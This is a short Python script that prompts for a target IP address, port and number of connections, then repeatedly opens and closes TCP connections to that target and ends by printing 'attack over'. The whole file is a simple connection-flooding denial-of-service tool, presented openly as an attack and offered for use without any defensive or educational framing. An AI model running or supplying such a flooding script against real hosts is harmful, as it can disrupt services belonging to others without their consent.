#!/usr/bin/env python
import socket

print ("IP :")
TCP_IP = input()
print ("port :")
TCP_PORT = int(input())
print("how many time ? (number of connexion)")
nb_conexion = int(input())
i = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while (i < nb_conexion):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    s.close()
    i = i + 1
    if (i%10 == 0):
        print(i, " connexions")
print("attack over")
